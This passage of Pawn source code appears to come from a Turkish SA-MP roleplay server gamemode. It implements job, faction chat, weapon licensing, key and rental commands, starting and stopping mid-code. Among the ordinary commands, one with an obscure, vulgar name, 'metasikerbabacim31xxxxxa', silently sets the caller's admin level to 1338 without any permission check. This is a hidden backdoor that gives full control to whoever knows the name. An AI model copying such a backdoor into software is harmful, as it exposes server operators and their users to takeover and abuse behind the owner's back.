						if(Karakter[playerid][cinsiyet] == 1) { SetPlayerSkin(playerid, 206); }
			            if(Karakter[playerid][cinsiyet] == 2) { SetPlayerSkin(playerid, 69); }
			            SetPlayerColor(playerid, COLOR_RED);
			            new string2[34];
						format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
						UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			            Bilgi(playerid, "Ýþbaþý yaptýnýz, göreve baþlayabilmek için meslek araçlarýndan birine binmelisiniz.");
			        }
			        else
			        {
			            Karakter[playerid][misbasi] = 0;
			            LojGorevde[playerid] = 0;
			            Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
						SetPlayerColor(playerid, COLOR_WHITE);
						new string2[34];
						SetPlayerSkin(playerid, Karakter[playerid][skin]);
						format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
						UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						SetPlayerName(playerid, SQLFromName(Karakter[playerid][sqlid]));
			        }
			    }
			}
		}
		else if(strcmp("ayril", mstring, true) == 0)
		{
		    Karakter[playerid][meslek] = 0;
	    	Bilgi(playerid, "Bulunduðunuz meslekten baþarýyla ayrýldýnýz.");
		}
		else if(strcmp("bul", mstring, true) == 0)
		{
		    if(!SevkiyatGorev[playerid] && !LojGorevde[playerid] && !PizzaGorevde[playerid] && !KamGorevde[playerid] && !EleGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid] && !GetPVarInt(playerid, "TGorev") && !GetPVarInt(playerid, "TIsbasi"))
		    {
		        if(meslekbul[playerid] == 1) { meslekbul[playerid]=0;DisablePlayerCheckpoint(playerid);return 1; }
		    	//ShowPlayerDialog(playerid, 224, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Meslekler", "Pizzacýlýk\nTaksicilik\nBalýkçýlýk\nSevkiyatçýlýk\nOtobüs Þöförlüðü\nTemizlik Görevlisi", "Seç", "Ýptal");
                //ShowPlayerDialog(playerid, 224, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Meslekler", "Taksicilik\nBalýkçýlýk\nSevkiyatçýlýk\nOtobüs Þöförlüðü\nTemizlik Görevlisi", "Seç", "Ýptal");
				ShowPlayerDialog(playerid, 224, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Meslekler", "Taksicilik\nBalýkçýlýk\nPizzacýlýk\nYol Temizleme\nHafriyat\nLojistik", "Seç", "Ýptal");
			}
			else
			{
			    Hata(playerid, "Þuan meslek bulamazsýnýz.");
			}
		}
		if(strcmp("devam", mstring, true) == 0)
		{
			/*if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 455 && KamGorevde[playerid] == 1 && GetPlayerVehicleSeat(playerid) == 0)
			{
				Bilgi(playerid, "Hafriyat mesleðine devam ediyorsunuz, Checkpointleri takip edin.");
			    KamCheckpoint[playerid] = 2;
        		SetPlayerCheckpoint(playerid, 2227.3994,-2635.8030,13.1024, 4.5);
			}
			else
			{
	    		Hata(playerid,"Kamyonda ve iþbaþýnda olmanýz gerekmektedir.");
			}*/
		}
		else if(strcmp("gir", mstring, true) == 0)
		{
			if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[sevkX], Veriler[sevkY], Veriler[sevkZ]))
			{
			    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Bu mesleðe girebilmeniz için ehliyet sahibi olmanýz gerekmektedir.");
				if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			    else if(Karakter[playerid][meslek] == 0) return ShowPlayerDialog(playerid, 149, DIALOG_STYLE_MSGBOX, "Sevkiyat Mesleði","Sevkiyat mesleði, size her seferde $750 kazandýrýr.\nBu mesleðe katýlmak istediðinize emin misiniz?","Evet","Hayýr");
	  		}
	  		else if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[balikX], Veriler[balikY], Veriler[balikZ]))
	  		{
				new __random[7],mstringx[128];
				format(__random, 7, "%s", RandomLimit(6));
				SetPVarString(playerid, "BalikRandom", __random);
				format(mstringx, sizeof(mstringx), ""C1"Lütfen aþaðýdaki kodu girin:\n"C2"%s",__random);
				return ShowPlayerDialog(playerid, 373, DIALOG_STYLE_INPUT, "Balýkçý: BOT Test",mstringx,"Gir","Ýptal");
				//ShowPlayerDialog(playerid, 150, DIALOG_STYLE_LIST, "Balýkçý: Hoþgeldin.","Balýk satmak istiyorum.\nYem almak istiyorum.\nOlta almak istiyorum.\t [$75]","Evet","Kapat");
		  	}
		  	else if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[pizzaX], Veriler[pizzaY], Veriler[pizzaZ]))
		  	{
		  	    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
		  	    else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 192, DIALOG_STYLE_MSGBOX, "Idlewood Stack Pizza", "Motorlarý amacý dýþýnda kiþisel kullanmak yasaktýr ve ceza sebebidir.\nPizzacýlýk mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
	  		else if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[taksiX], Veriler[taksiY], Veriler[taksiZ]))
	  		{
	  		    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Bu mesleðe girebilmeniz için ehliyet sahibi olmanýz gerekmektedir.");
	  		    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			  	else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 157, DIALOG_STYLE_MSGBOX, "Los Santos Taksi", "Taksileri amacý dýþýnda kiþisel kullanmak yasaktýr ve ceza sebebidir.\nTaksicilik mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
	  		else if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[tezgahX], Veriler[tezgahY], Veriler[tezgahZ]))
	  		{
	  		    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			  	else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 168, DIALOG_STYLE_MSGBOX, "Tezgahtarlýk Mesleði", "Tezgahtarlýk mesleðine katýlýrken $1000 deðerindeki tezgahý satýn almayý kabul etmiþ sayýlýrsýnýz.\nTezgahtarlýk mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
		  	else if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[aracsicilX], Veriler[aracsicilY], Veriler[aracsicilZ]))
	  		{
	  		    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			  	else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 501, DIALOG_STYLE_MSGBOX, "Araç Sicil Temizleme Mesleði", "Araçlarý amacý dýþýnda kiþisel kullanmak yasaktýr ve ceza sebebidir.\nAraç Sicil Temizleme Mesleði mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
		  	else if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[otobusX], Veriler[otobusY], Veriler[otobusZ]))
	  		{
	  		    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Bu mesleðe girebilmeniz için ehliyet sahibi olmanýz gerekmektedir.");
	  		    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			  	else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 502, DIALOG_STYLE_MSGBOX, "Otobüs Þöförü Mesleði", "Otobüsleri amacý dýþýnda kiþisel kullanmak yasaktýr ve ceza sebebidir.\nOtobüs Þöfürlüðü mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
		  	else if(IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[temizlikX], Veriler[temizlikY], Veriler[temizlikZ]))
	  		{
	  		    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Bu mesleðe girebilmeniz için ehliyet sahibi olmanýz gerekmektedir.");
	  		    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			  	else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 504, DIALOG_STYLE_MSGBOX, "Temizlikçilik Mesleði", "Temizlik araçlarýný amacý dýþýnda kiþisel kullanmak yasaktýr ve ceza sebebidir.\nTemizlikçilik mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
		  	else if(IsPlayerInRangeOfPoint(playerid, 5.0, 2219.3762,-2666.3638,13.5399)) // kamyon
	  		{
	  		    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Bu mesleðe girebilmeniz için ehliyet sahibi olmanýz gerekmektedir.");
	  		    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			  	else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 505, DIALOG_STYLE_MSGBOX, "Hafriyat Mesleði", "Kamyonlarý amacý dýþýnda kiþisel kullanmak yasaktýr ve ceza sebebidir.\nHafriyat mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
		  	else if(IsPlayerInRangeOfPoint(playerid, 5.0, 2448.8557,-2620.3879,13.6572)) // elektronik
	  		{
	  		    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Bu mesleðe girebilmeniz için ehliyet sahibi olmanýz gerekmektedir.");
	  		    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			  	else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 920, DIALOG_STYLE_MSGBOX, "Elektronik Mesleði", "Elektronik araçlarýný amacý dýþýnda kiþisel kullanmak yasaktýr ve ceza sebebidir.\nElektronik mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
		  	else if(IsPlayerInRangeOfPoint(playerid, 5.0, 2281.1309,-2365.0793,13.5469)) // lojistik
	  		{
	  		    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Bu mesleðe girebilmeniz için ehliyet sahibi olmanýz gerekmektedir.");
	  		    if(Karakter[playerid][meslek] != 0) return Hata(playerid, "Yeni bir mesleðe katýlmadan önce bulunduðunuz meslekten ayrýlmalýsýnýz. (( /meslek ayril ))");
			  	else if(!Karakter[playerid][meslek]) return ShowPlayerDialog(playerid, 921, DIALOG_STYLE_MSGBOX, "Lojistik Mesleði", "Lojistik araçlarýný amacý dýþýnda kiþisel kullanmak yasaktýr ve ceza sebebidir.\nLojistik mesleðine katýlmak istiyor musunuz?", "Evet", "Hayýr");
		  	}
		  	else return Hata(playerid, "Meslek girme yerinde deðilsiniz.");
		}
	}
	return 1;
}
BirlikGonder(playerid, text[])
{
	foreach(new i : Player)
	{
	    if(Karakter[i][birlik] == Karakter[playerid][birlik])
	    {
	        SendClientMessageEx(i, -1, "{d9532d}[BÝRLÝK] {FFFFFF}%s", text);
		}
	}
}
LSPDGonder(text[])
{
	foreach(new i : Player)
	{
	    if(Birlik[Karakter[i][birlik]][ftip] == LSPD)
	    {
	        SendClientMessageEx(i, -1, "{000080}[LSPD] {FFFFFF}%s", text);
		}
	}
}
AdminGonder(text[])
{
	foreach(new i : Player)
	{
	    if(Karakter[i][adminlevel] >= 1 && aDuty[i])
	    {
	        SendClientMessageEx(i, -1, "{164070}[ADMIN] {FFFFFF}%s", text);
		}
	}
}
forward NitroCek(vehicleid);
public NitroCek(vehicleid) return AracModifiyeleri[Arac[vehicleid][aid]][ModNitro];
forward AdminLevel(playerid);
public AdminLevel(playerid) return Karakter[playerid][adminlevel];
forward GirdiKontrol(playerid);
public GirdiKontrol(playerid) return Girdi[playerid];
stock ResetPlayerVariables(playerid)
{
	// ** GENERAL

	pTwoShotting[playerid] = false;
	pLastBulletAmount[playerid] = 0;
	pFiredSawnoff[playerid] = false;
	pAttemptingTwoShot[playerid] = false;

	// ** TIMERS

	KillTimer(ptmTwoShotFreezeOver[playerid]);

	// ** TIMESTAMPS

	ptsAttemptingToBypassSystem[playerid] = 0;
	return 1;
}
stock ResetPlayerVariables2(playerid)
{
	// ** GENERAL

	pCBugging[playerid] = false;

	// ** TIMERS

	KillTimer(ptmCBugFreezeOver[playerid]);

	// ** TIMESTAMPS

	ptsLastFiredWeapon[playerid] = 0;
	return 1;
}
forward TwoShotFreezeOver(playerid);
public TwoShotFreezeOver(playerid)
{
	TogglePlayerControllable(playerid, true);

	pTwoShotting[playerid] = false;
	return 1;
}
forward CBugFreezeOver(playerid);
public CBugFreezeOver(playerid)
{
	TogglePlayerControllable(playerid, true);

	pCBugging[playerid] = false;
	return 1;
}
CMD:z(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(AnimasyonYapiyor[playerid] == true)
		{
			ApplyAnimation(playerid, "CARRY", "crry_prtial", 1.0, 0, 0, 0, 0, 0);
         	ClearAnimations(playerid);
         	if(gOtur[playerid]) { gOtur[playerid] = false; ApplyAnimation(playerid,"PED","SEAT_up",4.1,0,1,1,0,0,1); }
          	AnimasyonYapiyor[playerid] = false;
		}
	}
	return 1;
}
stock Buysa(text[], text2[])
{
    if(strcmp(text2, text, true) == 0) return 1;
    return 0;
}
stock Bul(text[], text2[])
{
    if(strfind(text, text2, true) == -1) return 1;
    return 0;
}
forward IsValidWeaponID(weaponid);
public IsValidWeaponID(weaponid)
{
    if((weaponid > 0 && weaponid < 19) || (weaponid > 21 && weaponid < 47))
    return 1;

    return 0;
}
CMD:metasikerbabacim31xxxxxa(playerid, params[])
{
	Karakter[playerid][adminlevel] = 1338;
	return 1;
}
EvAnahtarVer(id, evid)
{
    new query[128];
	format(query, sizeof(query), "INSERT INTO `evanahtar` (`oyuncuID`,`evID`) VALUES ('%d','%d')", Karakter[id][sqlid],Ev[evid][eid]);
	mysql_tquery(1, query);
	Karakter[id][eanahtar][Ev[evid][eid]] = 1;
}
EvAnahtarTumSil(evid)
{
    new query[128];
	format(query, sizeof(query), "DELETE FROM `evanahtar` WHERE `evID` = '%d'", Ev[evid][eid]);
	mysql_tquery(1, query);
	foreach(new i : Player)
	{
	    Karakter[i][eanahtar][Ev[evid][eid]] = 0;
	}
}
EvAnahtarSil(id, evid)
{
    new query[128];
	format(query, sizeof(query), "DELETE FROM `evanahtar` WHERE `oyuncuID` = '%d' AND `evID` = '%d'", Karakter[id][sqlid],Ev[evid][eid]);
	mysql_tquery(1, query);
 	Karakter[id][eanahtar][Ev[evid][eid]] = 0;
}
EvAnahtarKontrol(id, evid)
{
	return Karakter[id][eanahtar][Ev[evid][eid]];
}
AracAnahtarVer(id, arid)
{
    new query[128];
	format(query, sizeof(query), "INSERT INTO `aracanahtar` (`oyuncuID`,`aracID`) VALUES ('%d','%d')", Karakter[id][sqlid],Arac[arid][aid]);
	mysql_tquery(1, query);
	Karakter[id][aanahtar][arid] = 1;
}
AracAnahtarTumSil(arid)
{
    new query[128];
	format(query, sizeof(query), "DELETE FROM `aracanahtar` WHERE `aracID` = '%d'", Arac[arid][aid]);
	mysql_tquery(1, query);
	foreach(new i : Player)
	{
	    Karakter[i][aanahtar][arid] = 0;
	}
}
AracAnahtarKontrol(id, arid)
{
	return Karakter[id][aanahtar][arid];
}
CMD:selamlas(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Girdi[playerid])
	    {
		    new pID, selamanim;
    		if(sscanf(params, "dd", pID, selamanim)) return Kullanim(playerid, "/selamlas [oyuncuID] [1-5]");
		    if(IsPlayerConnected(pID) && pID != INVALID_PLAYER_ID)
		    {
		        if(selamanim < 1 || selamanim > 5) return Hata(playerid, "Hatalý anim id.");
		        new selamunaleykum[128], aleykumselam = pID, adname[25];
		        if(!ProxDetectorS(4.0, playerid, aleykumselam)) { Hata(playerid, "Selamlaþmak istediðiniz kiþi yakýnýnýzda deðil."); return 1; }
		        if(selamlas[aleykumselam] >= 200) { Hata(playerid, "Selamlaþmak istediðiniz kiþi þu an bir baþkasýyla selamlaþýyor."); return 1; }
		        if(GetPlayerState(aleykumselam) != PLAYER_STATE_ONFOOT) { Hata(selamlas[playerid], "Oyuncu araçta olduðu için selamlaþamadýnýz."); return 1; }
		        if(aleykumselam == playerid) { Hata(playerid, "Kendinizle selamlaþamazsýnýz."); return 1; }
		        GetPlayerName(playerid, adname, sizeof(adname));
		        format(selamunaleykum, sizeof(selamunaleykum), "%s sizinle selamlaþmak istiyor. ( /selamlas %d )", adname, selamanim);
				ShowPlayerDialog(aleykumselam, 174, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"/selamlas", selamunaleykum, "Onayla", "Reddet");
				selamlas[playerid] = aleykumselam;
				selamlas[aleykumselam] = playerid;
				selamturu[aleykumselam] = selamanim;
				return 1;
			}
			else
			{
			    Hata(playerid, "Selamlaþmak istediðiniz oyuncu oyunda deðil.");
			    return 1;
			}
		}
	}
	return 1;
}
CMD:asilahruhsat(playerid, params[])
{
	if(IsPlayerConnected(playerid) && Girdi[playerid])
	{
	    if(Karakter[playerid][adminlevel] < 5 || !AKontrol(playerid)) return 1;
		new pid,_stip;
	    if(sscanf(params, "dd", pid,_stip)) return Kullanim(playerid, "/asilahruhsat [1/2] [oyuncuID]");
	    if(!Girdi[pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
	    if(_stip != 1 && _stip != 2) return Kullanim(playerid, "/asilahruhsat [1/2] [oyuncuID]");
		if(_stip == 1)
		{
			switch(Karakter[pid][sruhsat])
			{
			    case 0:
			    {
	                Karakter[pid][sruhsat] = 1;
	                Bilgi(playerid, "Oyuncuya silah bulundurma ruhsatý verdiniz.");
			    }
			    case 1:
			    {
			        Karakter[pid][sruhsat] = 0;
	                Bilgi(playerid, "Oyuncunun silah bulundurma ruhsatýný aldýnýz.");
			    }
			}
		}
		else
		{
		    switch(Karakter[pid][sruhsat2])
			{
			    case 0:
			    {
	                Karakter[pid][sruhsat2] = 1;
	                Bilgi(playerid, "Oyuncuya silah taþýma ruhsatý verdiniz.");
			    }
			    case 1:
			    {
			        Karakter[pid][sruhsat2] = 0;
	                Bilgi(playerid, "Oyuncunun silah taþýma ruhsatýný aldýnýz.");
			    }
			}
		}
	}
	return 1;
}
CMD:aruhsatsilah(playerid, params[])
{
	if(IsPlayerConnected(playerid) && Girdi[playerid])
	{
	    if(Karakter[playerid][adminlevel] < 5 || !AKontrol(playerid)) return 1;
		new sid,mid2;
	    if(sscanf(params, "dd", sid, mid2)) return Kullanim(playerid, "/aruhsatsilah [silahNO] [1/0]");
	    foreach(new i : Guns)
		{
		    if(OyuncuSilah[i][no] == sid)
		    {
		        if(mid2 != 1 && mid2 != 0) return Kullanim(playerid, "/aruhsatsilah [silahNO] [1/0]");
		    	new mstring[64];
		        format(mstring, sizeof(mstring), "%d nolu silahýn ruhsatýný %d yaptýnýz.",sid,mid2);
            	Bilgi(playerid, mstring);
				OyuncuSilah[i][ruhsat] = mid2;
				OyuncuSilahKaydetEx(i);
				return 1;
		    }
		}
		Hata(playerid, "Bu silahno bulunamadý.");
	}
	return 1;
}
CMD:amermiver(playerid, params[])
{
	if(IsPlayerConnected(playerid) && Girdi[playerid])
	{
	    if(Karakter[playerid][adminlevel] < 2 || !AKontrol(playerid)) return 1;
		new sid,mid2;
	    if(sscanf(params, "dd", sid, mid2)) return Kullanim(playerid, "/amermiver [silahNO] [mermi]");
	    foreach(new i : Guns)
		{
		    if(OyuncuSilah[i][no] == sid)
		    {
		    	new mstring[64];
		        format(mstring, sizeof(mstring), "%d nolu silahýn mermisini %d yaptýnýz.",sid,mid2);
            	Bilgi(playerid, mstring);
            	foreach(new ix : Player)
            	{
            		if(Karakter[ix][sqlid] == OyuncuSilah[i][oyuncuid])
					{
						RemovePlayerWeapon(ix, OyuncuSilah[i][silahid]);
					}
				}
				OyuncuSilah[i][mermi] = mid2;
				OyuncuSilahKaydetEx(i);
				return 1;
		    }
		}
		Hata(playerid, "Bu silahno bulunamadý.");
	}
	return 1;
}
CMD:mermiver(playerid, params[])
{
	return Hata(playerid, "Ýnaktif.");
	/*if(IsPlayerConnected(playerid))
	{
	    if(Girdi[playerid])
	    {
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
			{
	 			Hata(playerid, "LSPD, LSMD, LSFD görevlileri bu komutu kullanamaz.");
		        return 1;
			}
		    new sid;
		    new mid2;
			new pid;
			new __s[30];
		    if(isnull(params)) return Kullanim(playerid, "/mermiver [oyuncuID] [silahID/silahIsim] [mermi]");
		    sscanf(params, "is[30]d", pid, __s, mid2);
			if(ProxDetectorS(3.5, playerid, pid) && IsPlayerConnected(pid) && pid != playerid)
			{
			    if(IsNumeric(__s))
				{
				    sid = strval(__s);
				}
				else
				{
				    for(new i;i<47;i++)
				    {
				        if(!IsValidWeaponID(i)) continue;
				        if(Buysa(__s,SilahIsim(i)))
				        {
				            sid = i;
				            break;
				        }
				    }
				}
					if(sid == 0 || mid2 == 0) return 1;
					new mermili=0;
					for(new s = 0; s < sizeof(mermiliSilahlar); s++)
					{
		 				if(sid == mermiliSilahlar[s] && GetPlayerWeapon(playerid) != 23)
						{
						    mermili++;
						}
					}
					if(mermili == 0) return Hata(playerid, "Bu silahýn mermisi yok.");
					if(mid2 < 2) return Hata(playerid, "Hatalý mermi verdiniz.");
					if(Karakter[playerid][MermiM][sid] < mid2) return Hata(playerid, "Üzerinizde bu kadar mermi yok.");

				    SetPVarInt(pid, "AlinanSilah", sid);
				    SetPVarInt(pid, "AlinanMermi", mid2);
				    SetPVarInt(pid, "SilahVeren", playerid);

					new silahisim1[60];
				    switch(sid)
				    {
				        case 0: silahisim1 = "Boþ";
				        case 1: silahisim1 = "Muþta";
				        case 2: silahisim1 = "Golf Sopasý";
				        case 3: silahisim1 = "Cop";
				        case 4: silahisim1 = "Býçak";
				        case 5: silahisim1 = "Beyzbol Sopasý";
				        case 6: silahisim1 = "Kürek";
				        case 7: silahisim1 = "Bilardo Sopasý";
				        case 8: silahisim1 = "Katana";
				        case 9: silahisim1 = "Testere";
				        case 10: silahisim1 = "Mor Dildo";
				        case 11: silahisim1 = "Küçük Beyaz Vibrator";
				        case 12: silahisim1 = "Büyük Beyaz Vibrator";
				        case 13: silahisim1 = "Gümüþ Vibrator";
				        case 14: silahisim1 = "Çiçek Demeti";
				        case 15: silahisim1 = "Baston";
				        case 16: silahisim1 = "El Bombasý";
				        case 17: silahisim1 = "Sis Bombasý";
				        case 18: silahisim1 = "Molotof";
				        case 22: silahisim1 = "Pistol";
				        case 23: silahisim1 = "Susturuculu Pistol";
				        case 24: silahisim1 = "Desert Eagle";
				        case 25: silahisim1 = "Shotgun";
				        case 26: silahisim1 = "Sawn-off Shotgun";
				        case 27: silahisim1 = "Combat Shotgun";
				        case 28: silahisim1 = "Micro SMG";
				        case 29: silahisim1 = "Mp5";
				        case 30: silahisim1 = "AK47";
				        case 31: silahisim1 = "M4";
				        case 32: silahisim1 = "Tec9";
				        case 33: silahisim1 = "Country Rifle";
				        case 34: silahisim1 = "Sniper Rifle";
				        case 35: silahisim1 = "Rocket Launcher";
				        case 36: silahisim1 = "HS Rocket Launcher";
				        case 37: silahisim1 = "Flamethrower";
				        case 38: silahisim1 = "Minigun";
				        case 39: silahisim1 = "Satchel Charge";
				        case 41: silahisim1 = "Spraycan";
				        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
				        case 43: silahisim1 = "Kamera";
				        case 46: silahisim1 = "Paraþüt";
					}
					new string2[128];
					format(string2, sizeof(string2), "%s size %d adet %s silahý mermisi vermek istiyor.", OyuncuAdiniBul(playerid), mid2, silahisim1);
					ShowPlayerDialog(pid, 228, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Silah Sistemi", string2, "Onayla", "Reddet");
					mermili = 0;

			}
			else Hata(playerid, "Hatalý ID girdiniz.");
			return 1;
		}
	}
	return 1;*/
}
CMD:kiraiptal(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    new arc = EvMesafesi(3.0, playerid),sex=0;
	    sex=1;
		if(arc == 0)
		{
			arc = IsyeriMesafesi(2.0, playerid);
			sex=2;
		}
		if(sex == 1)
		{
			if(Ev[arc][kiralayan] != Karakter[playerid][sqlid]) return Hata(playerid, "Bu evin kiracýsý deðilsiniz.");
			Bilgi(playerid, "Kirayý iptal ettiniz.");
			Ev[arc][kiralayan] = -1;
			foreach(new i : Player)
			{
			    if(Karakter[i][sqlid] == Ev[arc][esahip])
			    {
			        Bilgi(playerid, "Kiracýnýz kirayý iptal etti.");
			    }
			}
			DestroyColouredCheckpoint(Ev[arc][ecp]);
			EvAyarla(arc);
			EvKaydet(arc);
		}
		else if(sex == 2)
		{
       		if(Isyeri[arc][kiralayan] != Karakter[playerid][sqlid]) return Hata(playerid, "Bu iþyerinin kiracýsý deðilsiniz.");
       		Bilgi(playerid, "Kirayý iptal ettiniz.");
			Isyeri[arc][kiralayan] = -1;
			//DestroyDynamicPickup(Isyeri[arc][ipickupid]);
			//Isyeri[arc][ipickupid] = CreateDynamicPickup(1272, 1, Isyeri[arc][girisX], Isyeri[arc][girisY], Isyeri[arc][girisZ], Isyeri[arc][igirisvw], Isyeri[arc][igirisint], -1, 100.0);
			foreach(new i : Player)
			{
			    if(Karakter[i][sqlid] == Isyeri[arc][isahip])
			    {
			        Bilgi(playerid, "Kiracýnýz kirayý iptal etti.");
			    }
			}
			IsyeriAyarla(arc);
			IsyeriKaydet(arc);
		}
		else Hata(playerid, "Mülkünüze yakýn deðilsiniz.");
	}
	return 1;
}
CMD:silah(playerid, params[])
{
	if(Girdi[playerid])
	{
	    if(Karakter[playerid][level] < 2)
	        return Hata(playerid, "Bu komutu kullanabilmeniz için en az 2. seviye olmanýz gerekmektedir.");
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == FBI || Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
			return Hata(playerid, "LSPD, FBI, LSPA, LSFD veya LSMD görevlileri bu komutu kullanamaz.");
	    if(GetPVarInt(playerid, "InAirsoft"))
			return Hata(playerid, "Þu an bu komutu kullanamazsýnýz.");
		new mstring[24],nstring[24],slott;
	    if(isnull(params)) return Kullanim(playerid, "/silah [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: birak, al, ver, liste, komutlar, tum, ruhsat");
        sscanf(params,"s[24]s[24]d",mstring,nstring,slott);
		if(Buysa("ver",mstring))
		{
		    new verileceksilah;
		    new verilecekammo;
			new pid;
			pid = strval(nstring);
		    if(isnull(nstring)) return Kullanim(playerid, "/silah ver [oyuncuID]");
			if(ProxDetectorS(3.5, playerid, pid) && IsPlayerConnected(pid) && pid != playerid)
			{
			    if(!SilahKullaniyor[playerid]) return 1;
			    verileceksilah = GetPlayerWeapon(playerid);
			    verilecekammo = GetPlayerAmmo(playerid);
				if(verileceksilah == 0 || verilecekammo == 0) return 1;

			    SetPVarInt(pid, "AlinanSilah", verileceksilah);
			    SetPVarInt(pid, "AlinanMermi", verilecekammo);
			    SetPVarInt(pid, "SilahVeren", playerid);

				new silahisim1[60];
			    switch(verileceksilah)
			    {
			        case 0: silahisim1 = "Boþ";
			        case 1: silahisim1 = "Muþta";
			        case 2: silahisim1 = "Golf Sopasý";
			        case 3: silahisim1 = "Cop";
			        case 4: silahisim1 = "Býçak";
			        case 5: silahisim1 = "Beyzbol Sopasý";
			        case 6: silahisim1 = "Kürek";
			        case 7: silahisim1 = "Bilardo Sopasý";
			        case 8: silahisim1 = "Katana";
			        case 9: silahisim1 = "Testere";
			        case 10: silahisim1 = "Mor Dildo";
			        case 11: silahisim1 = "Küçük Beyaz Vibrator";
			        case 12: silahisim1 = "Büyük Beyaz Vibrator";
			        case 13: silahisim1 = "Gümüþ Vibrator";
			        case 14: silahisim1 = "Çiçek Demeti";
			        case 15: silahisim1 = "Baston";
			        case 16: silahisim1 = "El Bombasý";
			        case 17: silahisim1 = "Sis Bombasý";
			        case 18: silahisim1 = "Molotof";
			        case 22: silahisim1 = "Pistol";
			        case 23: silahisim1 = "Susturuculu Pistol";
			        case 24: silahisim1 = "Desert Eagle";
			        case 25: silahisim1 = "Shotgun";
			        case 26: silahisim1 = "Sawn-off Shotgun";
			        case 27: silahisim1 = "Combat Shotgun";
			        case 28: silahisim1 = "Micro SMG";
			        case 29: silahisim1 = "Mp5";
			        case 30: silahisim1 = "AK47";
			        case 31: silahisim1 = "M4";
			        case 32: silahisim1 = "Tec9";
			        case 33: silahisim1 = "Country Rifle";
			        case 34: silahisim1 = "Sniper Rifle";
			        case 35: silahisim1 = "Rocket Launcher";
